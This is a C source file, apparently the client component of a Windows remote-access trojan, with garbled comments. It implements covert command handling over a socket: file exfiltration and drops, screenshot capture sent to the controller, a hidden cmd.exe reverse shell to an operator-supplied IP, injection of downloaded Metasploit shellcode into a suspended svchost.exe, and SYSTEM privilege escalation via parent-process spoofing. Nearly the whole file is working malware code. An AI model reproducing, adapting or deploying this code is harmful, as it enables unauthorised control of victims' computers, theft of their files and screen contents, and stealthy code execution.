#include "command.h"

// ���浱ǰ·��
char path[255];

// ���͵�ǰ·��
void SendPath(SOCKET sServer)
{
	ZeroMemory(path, sizeof(path));
	// �Ȼ�ȡ��ǰ·��
	if (getcwd(path, 250) != NULL)
	{
		SendData(sServer, path, sizeof(path));
		printf("send path\n");
	}
}

// �л�·��
BOOL ChangePath(char cmd[])
{
	// �Ƿ�ִ��cd����
	if (strnicmp(cmd, "cd", 2) != 0)
		return FALSE;

	// ��֧�� cd .. && cd ..���ָ�ʽ
	// �л�·��
	if (_chdir(cmd + 3) == -1)
	{
		return TRUE;
	}

	// ��ȡ��ǰ·��
	if (!getcwd(path, 255))
	{
		return TRUE;
	}
	return TRUE;
}

// �����ļ�
BOOL Download(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��upload����
	if (_strnicmp(cmd, "upload", 6) != 0)
		return FALSE;

	// �ж��Ƿ��յ�������Ϣ
	if (IsRecvError(sServer))
	{
		printf("file doesn't exist\n");
		return TRUE;
	}

	// ��ȡ�ļ���
	char file[128] = { 0 };
	ZeroMemory(file, sizeof(file));
	RecvData(sServer, file, sizeof(file));

	int fileSize;
	// ��ȡ�ļ���С
	RecvData(sServer, (char*)&fileSize, sizeof(fileSize));
	printf("recv file size is %d bytes\n", fileSize);

	// ��ȡ��ǰ·��
	char path[255];
	getcwd(path, 255);

	// �ļ���׺��
	char* extension = strrchr(file, '.');

	// ��ȡʱ���
	char time[25];
	GetTimestamp(time);

	// �����ļ�·��
	strcat(path, "\\");
	strcat(path, time);
	strcat(path, extension);

	FILE* fp = fopen(path, "wb");
	char buffer[256];
	if (fp == NULL)
	{
		printf("can't open file path\n");
		// ���ʹ�����Ϣ���Է�
		SendError(sServer);
		return TRUE;
	}

	// ���߶Է����Խ����ļ�������
	SendSuccess(sServer);

	// �����ļ�����
	printf("download %s\n", file);
	while (TRUE)
	{
		int size = recv(sServer, buffer, sizeof(buffer), 0);
		if (size == 0 || strcmp(buffer, "over") == 0)
			break;

		// д���ļ�
		fwrite(buffer, 1, size, fp);
	}

	fclose(fp);
	printf("save file to %s\n", path);

	// ������·�����͸��Է�
	SendData(sServer, path, sizeof(path));
	return TRUE;
}

// �ϴ��ļ�
BOOL Upload(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��download����
	if (_strnicmp(cmd, "download", 8) != 0)
		return FALSE;

	char file[128] = { 0 };
	ZeroMemory(file, sizeof(file));
	// ��ȡ�ļ���
	memcpy(file, cmd + 9, strlen(cmd) - 9);
	printf("upload %s\n", file);

	FILE* fp = fopen(file, "rb");
	// �ļ�������
	if (fp == NULL || fp == 0)
	{
		printf("�ļ�������\n");
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// �����ļ���
	SendData(sServer, file, sizeof(file));

	// ��ȡ�ļ���С
	fseek(fp, 0, SEEK_END);
	int fileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	printf("send file size is %d bytes\n", fileSize);
	// �����ļ���С
	SendData(sServer, (char*)&fileSize, sizeof(fileSize));

	if (IsRecvError(sServer))
	{
		return TRUE;
	}

	// �����ļ�����
	char buffer[256] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	int size;
	while (!feof(fp))
	{
		size = fread(buffer, 1, sizeof(buffer), fp);
		send(sServer, buffer, size, 0);
	}

	Sleep(1000);
	fclose(fp);
	// ��β�����Ǳ���Ҫ�е� ��Ϊ�������У�����һ���bug
	SendData(sServer, "over", 5);
	printf("send file over\n");

	return TRUE;
}

// ��������
BOOL Screen(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��screen����
	if (strnicmp(cmd, "screen", 6) != 0)
		return FALSE;

	// ��ȡʱ���
	char time[25];
	GetTimestamp(time);

	// �����ͼƬ·��
	char filePath[255];
	strcpy(filePath, path);
	strcat(filePath, "\\");
	strcat(filePath, time);
	strcat(filePath, ".jpg");

	// ����ʧ��
	if (!ScreenShot(filePath))
	{
		// �������� ���߷���������ʧ��
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// �����ɹ� ������Ƭ·��
	SendData(sServer, filePath, sizeof(filePath));

	// �ϴ�ͼƬ
	char downloadCmd[255] = "download ";
	strcat(downloadCmd, filePath);
	Upload(sServer, downloadCmd);

	// �ϴ���Ϻ�ɾ��ͼƬ
	remove(filePath);
	return TRUE;
}

// ����NC
BOOL NC(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��nc����
	if (_strnicmp(cmd, "nc ", 3) != 0)
		return FALSE;

	int size = strlen("nc");
	int index = Left(cmd, ' ');

	// ����nc��ʽ
	if (IsErrorFormat(cmd, index, size))
	{
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	char ip[20] = { 0 };
	char port[10] = { 0 };
	ZeroMemory(ip, sizeof(ip));
	ZeroMemory(port, sizeof(port));

	// ��ȡip
	GetIP(ip, cmd, index, size);
	// ��ȡ�˿�
	GetPort(port, cmd, index, size);

	int bRet = FALSE;

	SOCKET Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	// ����ʧ��
	if (Winsock == INVALID_SOCKET)
	{
		SendError(sServer);
		return TRUE;
	}

	SOCKADDR_IN nc;
	nc.sin_family = AF_INET;
	nc.sin_port = htons(atoi(port));
	nc.sin_addr.S_un.S_addr = inet_addr(ip);

	// �ɹ�����0
	bRet = WSAConnect(Winsock, (SOCKADDR*)&nc, sizeof(nc), NULL, NULL, NULL, NULL);
	if (bRet == SOCKET_ERROR)
	{
		SendError(sServer);
		return TRUE;
	}

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	si.cb = sizeof(si);
	// ���ش���
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	// �ض���ܵ�
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)Winsock;

	TCHAR szCommandLine[255] = TEXT("cmd.exe");
	bRet = CreateProcess(NULL, szCommandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	if (!bRet)
	{
		SendError(sServer);
		return TRUE;
	}

	printf("exec nc\n");
	SendSuccess(sServer);
	return TRUE;
}

// ��������
BOOL Drive(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��drive����
	if (_strnicmp(cmd, "drive", 5) != 0)
		return FALSE;

	ZeroMemory(cmd, 255);
	// ʹ��cmd��ԭ������
	strcpy(cmd, "for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %i: echo %i:");
	SendCmdResult(sServer, cmd);
	return TRUE;
}

// ����msf
BOOL MSF(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��msf����
	if (_strnicmp(cmd, "msf ", 4) != 0)
		return FALSE;

	ULONG32 size;

	int length = strlen("msf");
	int index = Left(cmd, ' ');

	// ����msf��ʽ
	if (IsErrorFormat(cmd, index, length))
	{
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	char ip[20] = { 0 };
	char port[10] = { 0 };
	ZeroMemory(ip, sizeof(ip));
	ZeroMemory(port, sizeof(port));

	// ��ȡip
	GetIP(ip, cmd, index, length);
	// ��ȡ�˿�
	GetPort(port, cmd, index, length);

	// ��msf��������
	SOCKET msf = socket(AF_INET, SOCK_STREAM, 0);
	if (msf == INVALID_SOCKET)
	{
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	int ret = 0;
	// ���÷��͵�ַ
	SOCKADDR_IN server;
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(port));
	ret = inet_pton(AF_INET, ip, &server.sin_addr.S_un.S_addr);
	if (ret != 1)
	{
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	ret = connect(msf, (SOCKADDR*)&server, sizeof(SOCKADDR));
	// ����ʧ��
	if (ret == SOCKET_ERROR)
	{
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// ��������ʧ��
	int count = recv(msf, (char*)&size, 4, 0);
	if (count != 4 || size <= 0)
	{
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// ���ܽ���

	/* ����ռ� */
	unsigned char* buffer = (unsigned char*)malloc(sizeof(unsigned char) * size + 6);
	if (!buffer)
	{
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);
	buffer[0] = 0xC0;
	buffer[0] -= 1;
	memcpy(buffer + 1, &msf, 4);

	// ��ʼ���ṹ��
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);

	BOOL bRet = FALSE;
	// �����������
	bRet = CreateProcessA(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
	if (!bRet)
	{
		free(buffer);
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// �ڽ���������ռ�
	LPVOID lpAddress = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpAddress)
	{
		free(buffer);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// ������������
	int tret = 0;
	int nret = 0;

	void* startb = buffer + 5;
	char* tb = (char*)startb;
	while (tret < (int)size)
	{
		nret = recv(msf, tb, size - tret, 0);
		tb += nret;
		tret += nret;
		// ��������ʧ��
		if (nret == SOCKET_ERROR)
		{
			free(buffer);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			SendError(sServer);
			closesocket(msf);
			return TRUE;
		}
	}

	SendSuccess(sServer);

	// д��shellcode����
	bRet = WriteProcessMemory(pi.hProcess, lpAddress, buffer, size + 6, NULL);
	if (!bRet)
	{
		free(buffer);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// ��ȡ�߳�������
	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_FULL;
	bRet = GetThreadContext(pi.hThread, &threadContext);
	if (!bRet)
	{
		free(buffer);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	//	�޸��߳���������EIP / RIP��ֵΪ������ڴ���׵�ַ
#ifdef _WIN64 
	// 64λ    
	threadContext.Rip = (DWORD64)lpAddress;
#else     
	// 32λ
	threadContext.Eip = (DWORD)lpAddress;
#endif

	// ���ù�����̵��߳�������
	bRet = SetThreadContext(pi.hThread, &threadContext);
	if (!bRet)
	{
		free(buffer);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// �ָ����߳�
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	free(buffer);

	Sleep(1000);
	return TRUE;
}

// ��Ȩ �����ԱȨ��
BOOL GetSystem(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��getsystem����
	if (_strnicmp(cmd, "getsystem", 9) != 0)
		return FALSE;

	// ��ǰ�û�û�й���ԱȨ��
	if (!IsUserAnAdmin())
	{
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// �����õ�����Ȩ��
	EnableDebugAbility();

	// ������
	DWORD processCnt = 0;
	// ��ȡ�б�ָ��
	PWTS_PROCESS_INFO_EX processList = GetProcessList(&processCnt);
	// ��ȡ�����б�ʧ��
	if (!processList)
	{
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// ����ṹ��ָ��
	PWTS_PROCESS_INFO_EX tempList = processList;

	char buffer[256] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));

	// ��¼ע���pid
	DWORD pid = -1;

	// ѭ����������ƭ
	for (DWORD i = 0; i < processCnt; i++)
	{
		// ��ȡȨ��
		GetAccount(tempList->pUserSid, buffer);
		// �жϽ����Ƿ�ӵ��systemȨ��
		if (strcmp(buffer,"NT AUTHORITY\\SYSTEM") == 0)
		{
			// ���Ը�������ƭ
			if (PPIDSpoofing(sServer, tempList->ProcessId))
			{
				pid = tempList->ProcessId;
				break;
			}
		}
		ZeroMemory(buffer, sizeof(buffer));

		// �Ƶ���һ������
		tempList++;
	}
	
	// �ͷ��ڴ�
	WTSFreeMemoryEx(WTSTypeProcessInfoLevel1, processList, processCnt);
	processList = NULL;

	// ע��ʧ��
	if (pid == -1)
	{
		SendError(sServer);
		return TRUE;
	}

	ZeroMemory(buffer, sizeof(buffer));
	IntToStr(pid, buffer);
	//����ע��ɹ����pid
	SendData(sServer, buffer, 20);

	printf("sucess to %d\n", pid);
	return TRUE;
}

// ��ȡpid
BOOL GetPID(SOCKET sServer, char cmd[])
{
	// �Ƿ�ִ��getpid����
	if (_strnicmp(cmd, "getpid", 6) != 0)
		return FALSE;

	DWORD pid = GetCurrentProcessId();
	char buffer[10] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	IntToStr(pid, buffer);
	SendData(sServer, buffer, sizeof(buffer));

	return TRUE;
}

// �����˵�
BOOL Help(char cmd[])
{
	// �Ƿ�ִ��help����
	if (_strnicmp(cmd, "help", 4) != 0)
		return FALSE;

	return TRUE;
}

// ִ������
void ExecCmd(SOCKET sServer, char cmd[])
{
	// ��������
	if (Help(cmd))
		return;

	// ��ȡpid
	if (GetPID(sServer, cmd))
		return;
	
	// ��Ȩ��system
	if (GetSystem(sServer, cmd))
		return;

	// ����msf
	if (MSF(sServer, cmd))
		return;
	

	// ��������
	if (Drive(sServer, cmd))
		return;

	// ����NC
	if (NC(sServer, cmd))
		return;

	// �鿴����
	if (PS(sServer, cmd))
		return;

	// ��Ļ��ͼ
	if (Screen(sServer, cmd))
		return;

	// ִ���ļ�����
	if (Download(sServer, cmd))
		return;

	// ִ���ļ��ϴ�
	if (Upload(sServer, cmd))
		return;

	// ִ��cd����
	if (ChangePath(cmd))
		return;

	// ִ��cmd����
	SendCmdResult(sServer, cmd);
	printf("send cmd result over\n");
}

// ����cmdִ�к�Ľ��
void SendCmdResult(SOCKET sServer, char cmd[])
{
	FILE* fp;
	char buffer[1024] = { 0 };
	if ((fp = _popen(cmd, "r")) == NULL)
	{
		SendError(sServer);
		return;
	}

	SendSuccess(sServer);

	// ���ﻹ�������⣬����Է�ִ��dir asdf����Է��ղ�������ȫ������Ϣ
	// cd asdf buffer�������ǿյ� ��������Ӧ����ϵͳ�Ҳ���ָ����·����
	while (fgets(buffer, sizeof(buffer), fp) != NULL)
	{
		send(sServer, buffer, sizeof(buffer), 0);
		ZeroMemory(buffer, sizeof(buffer));
	}

	_pclose(fp);
	// ����SendOver���߶Է������Խ���Ѿ��������
	SendData(sServer, "SendOver", 9);
}

// ��ȡʱ���
void GetTimestamp(char str[])
{
	time_t now;
	time(&now);
	_itoa((int)now, str, 10);
}
